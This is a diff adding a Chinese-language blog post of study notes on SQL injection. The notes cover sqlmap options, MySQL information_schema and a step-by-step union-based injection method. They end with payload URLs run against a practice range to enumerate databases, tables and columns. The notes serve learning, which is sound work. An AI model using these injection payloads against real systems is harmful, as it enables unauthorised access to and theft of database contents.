@@ -86,7 +86,50 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="sql基础1"><a href="#sql基础1" class="headerlink" title="sql基础1"></a>sql基础1</h3><h3 id="sqlmap-get"><a href="#sqlmap-get" class="headerlink" title="sqlmap get"></a>sqlmap get</h3><p>python sqlmap -u *** </p>
+<p>先跑数据库 –dbms=***(跑出的数据库类型) 再跑表–tables 再跑列 -T “user” –columns 再跑字段 –C “username,….”</p>
+<h3 id="显错注入-联合查询"><a href="#显错注入-联合查询" class="headerlink" title="显错注入-联合查询"></a>显错注入-联合查询</h3><h5 id="方法：是否存在注入点-gt-猜解字段数-gt-联合查询寻找输出-gt-系统自带库查询表名、字段名-gt-查询字段值"><a href="#方法：是否存在注入点-gt-猜解字段数-gt-联合查询寻找输出-gt-系统自带库查询表名、字段名-gt-查询字段值" class="headerlink" title="方法：是否存在注入点-&gt;猜解字段数-&gt;联合查询寻找输出-&gt;系统自带库查询表名、字段名-&gt;查询字段值"></a>方法：是否存在注入点-&gt;猜解字段数-&gt;联合查询寻找输出-&gt;系统自带库查询表名、字段名-&gt;查询字段值</h5><p>数据库基本知识：</p>
+<p>【Mysql在5.0以上版本加入了 information_schema 这个系统自带库 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等<br>information_schema.tables 存放表名和库名的对应；information_schema.columns 存放字段名和表名的对应】</p>
+<h5 id="order-by指令是语句用于根据指定的列对结果集进行排序如图（举例）"><a href="#order-by指令是语句用于根据指定的列对结果集进行排序如图（举例）" class="headerlink" title="order by指令是语句用于根据指定的列对结果集进行排序如图（举例）"></a>order by指令是语句用于根据指定的列对结果集进行排序如图（举例）</h5><img src="/2020/08/26/ctf-web5/博客\source\_posts\ctf-web5\1.png" style="zoom: 50%;">
+
+<img src="/2020/08/26/ctf-web5/博客\source\_posts\ctf-web5\2.png" alt="2" style="zoom: 50%;">
+
+<img src="/2020/08/26/ctf-web5/博客\source\_posts\ctf-web5\3.png" alt="3" style="zoom: 50%;">
+
+<img src="/2020/08/26/ctf-web5/博客\source\_posts\ctf-web5\4.png" alt="4" style="zoom: 50%;">
+
+<p>test表里有两列 order by 1或者 order by test即用第一列排序而order by 2或者 order by test2用第一列排序，当order by 3是因为没有第三列而报错，<strong>所以用order by来判断列数</strong> -&gt; 这里共两列</p>
+<h5 id="union-select联合-合并：将多条查询语句的结果合并成一个结果（举例）"><a href="#union-select联合-合并：将多条查询语句的结果合并成一个结果（举例）" class="headerlink" title="union select联合 合并：将多条查询语句的结果合并成一个结果（举例）"></a>union select联合 合并：将多条查询语句的结果合并成一个结果（举例）</h5><img src="/2020/08/26/ctf-web5/博客\source\_posts\ctf-web5\5.png" style="zoom: 50%;">
+
+<img src="/2020/08/26/ctf-web5/博客\source\_posts\ctf-web5\6.png" alt="6" style="zoom: 50%;">
+
+<h5 id="limit-a-b限制输出从a起共b条数据：limit-0-1限制输出第一条；limit-1-1限制输出第二条…"><a href="#limit-a-b限制输出从a起共b条数据：limit-0-1限制输出第一条；limit-1-1限制输出第二条…" class="headerlink" title="limit a,b限制输出从a起共b条数据：limit 0,1限制输出第一条；limit 1,1限制输出第二条…"></a>limit a,b限制输出从a起共b条数据：limit 0,1限制输出第一条；limit 1,1限制输出第二条…</h5><img src="/2020/08/26/ctf-web5/博客\source\_posts\ctf-web5\7.png" style="zoom:50%;">
+
+<h5 id="“SELECT-FROM-test-WHERE-id-id-“或者id-’-id’或者id-‘-id’-等等，我们需要通过构造错误的语句根据返回结果判断是否存在注入点"><a href="#“SELECT-FROM-test-WHERE-id-id-“或者id-’-id’或者id-‘-id’-等等，我们需要通过构造错误的语句根据返回结果判断是否存在注入点" class="headerlink" title="“SELECT * FROM test WHERE id=$id “或者id=’$id’或者id=(‘$id’)等等，我们需要通过构造错误的语句根据返回结果判断是否存在注入点"></a>“SELECT * FROM test WHERE id=$id “或者id=’$id’或者id=(‘$id’)等等，我们需要通<u>过构造错误的语句根据返回结果判断是否存在注入点</u></h5><p>通过注释将末尾指令注释，例：SELECT * FROM test WHERE id=(‘1 and 1=1’) – balaba’)</p>
+<p>通常用–+表示注释，加号代表空格，但是会有些特殊情况，我习惯用– balab注释</p>
+<p>1.判断注入点：以第一种为例id=1’ 在1后面加上单引号，页面出错；id=1 and 1=1 正常 id=1 and 1=2 错误</p>
+<p>2.判断字段数：通过order by的回显</p>
+<p>3.判断回显点：union select</p>
+<p>4.查询相关内容：***UNION 内部的 SELECT 语句必须拥有相同数量的列！！！</p>
+<p>​    a.查数据库：and 1=2 union select 1,schema_name from information_schema.schemata limit 0,1</p>
+<p>​    b.猜询表名：<br>and 1=2 union select 1,table_name from information_schema.tables where table_schema=’库名’ limit 1,1</p>
+<p>​    c.查询字段名：</p>
+<p>and 1=2 union select 1,column_name from information_schema.columns where table_schema=’库名’ and table_name=’表名’ limit 0,1</p>
+<p>​    d.查询字段内容<br>and 1=2 union select 1,name from ‘表名’</p>
+<h5 id="练习靶场"><a href="#练习靶场" class="headerlink" title="练习靶场"></a>练习靶场</h5><p>判断注入点：</p>
+<p><a href="http://shop.aqlab.cn:8001/single.php?id=1&#39;" target="_blank" rel="noopener">http://shop.aqlab.cn:8001/single.php?id=1&#39;</a> and 1=1–+正常显示</p>
+<p><a href="http://shop.aqlab.cn:8001/single.php?id=1&#39;" target="_blank" rel="noopener">http://shop.aqlab.cn:8001/single.php?id=1&#39;</a> and 1=2–+显示无结果</p>
+<p>判断字段总数</p>
+<p><a href="http://shop.aqlab.cn:8001/single.php?id=1&#39;" target="_blank" rel="noopener">http://shop.aqlab.cn:8001/single.php?id=1&#39;</a> order by 1–+正常显示（直到4，报错共有三列，判断列数</p>
+<p>判断显示位</p>
+<p><a href="http://shop.aqlab.cn:8001/single.php?id=1&#39;" target="_blank" rel="noopener">http://shop.aqlab.cn:8001/single.php?id=1&#39;</a> and 1=2 union select 1,2,3–+</p>
+<p>查找当前数据库 –cake</p>
+<p><a href="http://shop.aqlab.cn:8001/single.php?id=1&#39;" target="_blank" rel="noopener">http://shop.aqlab.cn:8001/single.php?id=1&#39;</a> and 1=2 union select 1,2,database() –+</p>
+<p>查表名–cakes </p>
+<p><a href="http://shop.aqlab.cn:8001/single.php?id=1&#39;" target="_blank" rel="noopener">http://shop.aqlab.cn:8001/single.php?id=1&#39;</a> and 1=2 union select 1,2,table_name from information_schema.tables where table_schema=’cake’ limit 0,1 –+</p>
+<p>查字段–id title body</p>
+<p><a href="http://shop.aqlab.cn:8001/single.php?id=1&#39;" target="_blank" rel="noopener">http://shop.aqlab.cn:8001/single.php?id=1&#39;</a> and 1=2 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’cakes’ limit 2,1</p>
+
       
     </div>
     <footer class="article-footer">
